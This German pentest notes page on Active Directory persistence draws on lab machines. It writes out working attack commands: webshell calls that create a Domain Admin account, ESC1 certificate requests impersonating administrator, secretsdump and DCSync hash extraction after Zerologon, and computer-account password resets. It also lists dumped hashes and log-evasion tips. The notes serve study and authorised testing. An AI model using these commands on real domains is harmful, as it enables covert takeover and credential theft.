# Persistence


## Ziel der Persistence Phase

- Langfristigen Zugriff auf kompromittierte Systeme sichern
- Überleben von Reboots und Credential-Änderungen
- Mehrere Zugriffspunkte etablieren

---

## Relevante Techniken & Vorgehensweisen

### Domain User Creation

**Via Webshell:**


```bash
curl "http://<TARGET_IP>/dev/back.php?c=net%20user%20harry%20haxxor@12345%20/add%20/domain"
```

**In Shell:**

cmd

```cmd
net user harry haxxor@12345 /add /domain
```

**Konzept:**

- Eigener Domain-Account
- Überdauert Reboots
- Kann zu Admin-Gruppen hinzugefügt werden

### Privileged Group Membership

**Lokale Administratoren:**


```bash
curl "http://<TARGET_IP>/dev/back.php?c=net%20localgroup%20Administrators%20harry%20/add%20/domain"
```

**Domain Admins:**

cmd

```cmd
net group "Domain Admins" harry /add /domain
```

**Konzept:**

- Erhöhte Berechtigungen persistent
- Zugriff auf alle Domain-Ressourcen

### Hash Extraction & Storage

**NTDS.dit lokal speichern:**


````bash
# Nach Download von DC
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

**Hashes sichern:**
```
Administrator:ee4457ae59f1e3fbd764e33d9cef123d
krbtgt:1e242a90fb9503f383255a4328e75756
````

**Konzept:**

- Pass-the-Hash auch nach Passwort-Änderung
- Offline-Access zu allen Domain-Hashes

### Computer Account Control

**Passwort ändern:**


```bash
changepasswd.py retro.vl/banking$:banking@<TARGET_IP> -altuser trainee -altpass trainee -newpass password1@
```

**Konzept:**

- Computer-Accounts überleben länger als User-Sessions
- Können für Certificate Requests genutzt werden
- Domain Computers Group Membership

### Certificate-based Persistence (ADCS)

**Certificate für Administrator anfordern:**


````bash
certipy-ad req -u 'banking$@retro.vl' -p 'password1@' -ca 'retro-DC-CA' -target 'dc.retro.vl' -template 'RetroClients' -upn 'administrator@retro.vl' -dns 'dc.retro.vl' -key-size 4096 -dc-ip <TARGET_IP>
```

**Certificate lokal speichern:**
```
administrator_dc.pfx
````

**Authentication (jederzeit wiederholbar):**


````bash
certipy-ad auth -pfx administrator_dc.pfx -dc-ip <TARGET_IP>
```

**Konzept:**
- Certificate überlebt Passwort-Änderungen
- Kann NT-Hash jederzeit neu generieren
- Solange Template verwundbar bleibt

### krbtgt Hash (Golden Ticket)

**krbtgt Hash aus DCSync:**
```
krbtgt:1e242a90fb9503f383255a4328e75756
```

**Konzept:**
- Kann für Golden Ticket Attacks verwendet werden
- Überdauert alle Passwort-Änderungen
- Nur durch zweimaliges krbtgt-Passwort-Reset ungültig

### Trust-Key Extraction

**Child-to-Parent Escalation:**
```
Trust-Key:4db3f9d7f1f1da776092e0cce7521a3f
```

**Konzept:**
- Ermöglicht wiederkehrende Parent Domain Access
- Überdauert User-Passwort-Änderungen

---

## Betriebssystem-spezifische Aspekte (Windows)

### Active Directory Persistence

**Domain User:**
- Netzwerkweit gültig
- Überdauert lokale Kompromittierung
- Kann remote genutzt werden

**Group Membership:**
- Domain Admins: Full Domain Control
- Enterprise Admins: Multi-Domain Control
- Local Administrators: System-spezifisch

**Computer Accounts:**
- Weniger verdächtig als neue User
- Automatisches Passwort-Management
- Domain Computers Group

### Certificate Services (ADCS)

**Certificate Lifetime:**
- Standardmäßig mehrere Jahre gültig
- Unabhängig von Passwort-Änderungen
- Kann nicht einfach widerrufen werden

**ESC1-Vulnerable Templates:**
- RetroClients
- HybridComputers
- Enrollee Supplies Subject

### Kerberos

**krbtgt Account:**
- Key Distribution Center (KDC)
- Hash für Golden Tickets
- Selten geändert

**Trust Relationships:**
- Trust-Key für Cross-Domain
- Child-to-Parent permanent

---

## Typische Angriffsflächen

### Eigene Accounts

**Domain User Creation:**
- Eigener Benutzer im Active Directory
- Volle Kontrolle über Credentials
- Kann zu privilegierten Gruppen hinzugefügt werden

**Konzept (Trusted VM):**
```
User: harry:haxxor@12345
Groups: Local Administrators, Domain Admins
```

### Hash-basierte Persistence

**NTDS.dit Offline:**
- Alle Domain-Hashes lokal gespeichert
- Pass-the-Hash jederzeit möglich
- Keine Live-Verbindung nötig

**krbtgt Hash:**
- Golden Ticket Generation
- Unbegrenzte Domain-Tickets

### Certificate-basierte Persistence

**ADCS ESC1:**
- Certificate einmal anfordern
- Mehrfach authentifizieren
- NT-Hash on-demand

**Beispiel (Retro VM):**
```
Template: RetroClients
Certificate: administrator@retro.vl
Gültigkeitsdauer: Mehrere Jahre
````

### Computer Account Takeover

**Alter/ungepatchter Account:**

- BANKING$ (Retro VM)
- Passwort-Kontrolle übernommen
- Domain Computers Enrollment Rights

---

## Wichtige Befehle & Syntax

### Domain User Creation

cmd

```cmd
net user <USER> <PASS> /add /domain
net localgroup Administrators <USER> /add /domain
net group "Domain Admins" <USER> /add /domain
```

### Computer Account Password


```bash
changepasswd.py <DOMAIN>/<COMPUTER$>:<OLD_PASS>@<TARGET_IP> -altuser <USER> -altpass <PASS> -newpass <NEW_PASS>
```

### Certificate Request


```bash
certipy-ad req -u '<ACCOUNT>@<DOMAIN>' -p '<PASS>' -ca '<CA_NAME>' -target '<DC>' -template '<TEMPLATE>' -upn '<TARGET_UPN>' -key-size 4096 -dc-ip <IP>
```

### Certificate Authentication


```bash
certipy-ad auth -pfx <PFX_FILE> -dc-ip <IP>
```

### Hash Extraction


````bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
secretsdump.py -no-pass '<DOMAIN>/<DC$>'@<IP> -just-dc
secretsdump.py -hashes :<HASH> <DOMAIN>/<USER>@<IP>
```

---

## Reihenfolge & Abhängigkeiten

### Domain User Persistence Flow

1. **Initial Access** → Shell (apache/www-data)
2. **Webshell** → back.php?c=
3. **User erstellen** → net user /add /domain
4. **Zu Admins** → net localgroup Administrators /add
5. **Zu Domain Admins** → net group "Domain Admins" /add
6. **Test** → Evil-WinRM Login
7. **Dokumentieren** → harry:haxxor@12345

**Beispiel (Trusted VM):**
```
Webshell: back.php
Created: harry:haxxor@12345
Groups: Administrators, Domain Admins
Persistent: Ja (überdauert Reboots)
```

### Hash Extraction Persistence Flow

1. **Volume Shadow Copy** → NTDS.dit
2. **Download** → Evil-WinRM download
3. **Hash Extraction** → secretsdump lokal
4. **Dokumentieren** → Alle Hashes sichern
5. **Test** → Pass-the-Hash
6. **Backup** → Hashes extern speichern

**Beispiel (Baby VM):**
```
Method: SeBackupPrivilege → Shadow Copy
NTDS.dit: Lokal gespeichert
Administrator: ee4457ae59f1e3fbd764e33d9cef123d
krbtgt: [Hash gesichert]
Persistent: Ja (offline verfügbar)
```

### Certificate Persistence Flow

1. **Computer Account** → Passwort ändern/bekannt
2. **Certificate anfordern** → certipy req (ESC1)
3. **PFX speichern** → administrator_dc.pfx
4. **Test** → certipy auth
5. **Dokumentieren** → Certificate-Datei sichern
6. **Wiederholung** → Jederzeit erneut authentifizieren

**Beispiel (Retro VM):**
```
Account: banking$ (Computer Account)
Template: RetroClients (ESC1)
Certificate: administrator@retro.vl
File: administrator_dc.pfx
Test: certipy auth → Hash erfolgreich
Persistent: Ja (Certificate mehrere Jahre gültig)
```

### DCSync Persistence Flow (nach Zerologon)

1. **Zerologon** → DC Machine Account = leer
2. **DCSync** → secretsdump -no-pass
3. **Alle Hashes** → -just-dc
4. **krbtgt sichern** → Golden Ticket Material
5. **Administrator Hash** → Pass-the-Hash
6. **Optional** → DC-Passwort wiederherstellen
7. **Dokumentieren** → Offline Hash-Datenbank

**Beispiel (Retro2 VM):**
```
Zerologon: BLN01$ Password = leer
DCSync: Alle Domain-Hashes extrahiert
Administrator: c06552bdb50ada21a7c74536c231b848
krbtgt: 1e242a90fb9503f383255a4328e75756
Persistent: Ja (offline verfügbar)
```

---

## Typische Findings & Fehler

### Erfolgreiche Persistence

**Trusted (Domain User):**
```
User: harry:haxxor@12345
Created via: Webshell (net user /add /domain)
Groups: Local Administrators, Domain Admins
Test: Evil-WinRM erfolgreich
Result: Full Domain Control persistent
```

**Baby (Hash Extraction):**
```
Method: Volume Shadow Copy (SeBackupPrivilege)
NTDS.dit: Extrahiert und lokal gespeichert
Administrator: ee4457ae59f1e3fbd764e33d9cef123d
krbtgt: [Hash gesichert]
Test: Pass-the-Hash erfolgreich
Result: Offline Domain Access
```

**Retro (Certificate Persistence):**
```
Computer Account: BANKING$ (Password geändert)
Template: RetroClients (ESC1)
Certificate: administrator@retro.vl
File: administrator_dc.pfx
Test: certipy auth → Hash on-demand
Result: Langfristige Admin-Access
Gültigkeit: Mehrere Jahre
```

**Retro2 (DCSync):**
```
Attack: Zerologon → DC Machine Account = leer
DCSync: secretsdump -no-pass
Extracted: Alle Domain-Hashes
Administrator: c06552bdb50ada21a7c74536c231b848
krbtgt: 1e242a90fb9503f383255a4328e75756
Test: Pass-the-Hash erfolgreich
Result: Vollständiger Offline-Zugriff
```

**Trusted (Child-to-Parent):**
```
Child: lab.trusted.vl (harry Domain Admin)
Parent: trusted.vl
Trust-Key: 4db3f9d7f1f1da776092e0cce7521a3f
Parent Admin: 15db914be1e6a896e7692f608a9d72ef
Test: Evil-WinRM Parent DC erfolgreich
Result: Enterprise Admin persistent
```

**Hybrid (Pass-the-Cert):**
```
Machine Account: MAIL01$
Certificate: administrator@hybrid.vl (ESC1)
Method: PassTheCert → Password Reset
New Password: Password123!
Test: Evil-WinRM erfolgreich
Result: Certificate + neues Passwort = doppelte Persistence
````

### Persistence-Fehler

**Domain User Creation schlägt fehl:**

- /domain Flag vergessen → Lokaler User (nicht persistent netzwerkweit)
- Berechtigungen fehlen → Webshell nicht als SYSTEM
- Password Policy → Komplexität nicht erfüllt

**Hash Extraction unvollständig:**

- Nur Administrator gesichert → krbtgt vergessen
- SYSTEM-Datei fehlt → Secrets nicht extrahierbar
- Download fehlgeschlagen → Evil-WinRM Verbindung verloren

**Certificate Persistence:**

- PFX-Datei verloren → Persistence verloren
- Template gepatcht → ESC1 nicht mehr verwundbar
- Certificate abgelaufen → Gültigkeit prüfen

**Pass-the-Hash nach Passwort-Änderung:**

- User-Passwort geändert → Hash ungültig
- krbtgt zweimal geändert → Golden Tickets ungültig
- Computer Account Reset → Hash ungültig

### Persistence-Lebensdauer

**Kurz (<1 Woche):**

- Meterpreter Session (bis Reboot)
- Webshell (bis Datei entdeckt/gelöscht)
- User-Hash (bis Passwort-Änderung)

**Mittel (1 Woche - 3 Monate):**

- Domain User ohne Admin-Rechte
- Computer Account (bis automatisches Reset)

**Lang (3+ Monate):**

- Domain Admin Account
- NTDS.dit Offline (alle Hashes)
- Certificate (mehrere Jahre)
- krbtgt Hash (bis doppeltes Reset)
- Trust-Key (bis Trust entfernt)

### OPSEC-Hinweise

**Domain User Creation:**

- Auffällig in Event Logs
- User-Name wählen der nicht auffällt
- Nicht zu "Domain Admins" hinzufügen wenn nicht nötig

**Hash Extraction:**

- Volume Shadow Copy generiert Event Logs
- NTDS.dit Download erkennbar
- Offline-Nutzung unerkennbar

**Certificate Persistence:**

- Certificate Request geloggt
- Aber: Wiederholte Authentication weniger auffällig als Login-Versuche

**Hinweis (Lock VM):**

- Backup original files → `copy BootTime.exe BootTime.exe.bak`
- Cleanup wichtig in Production
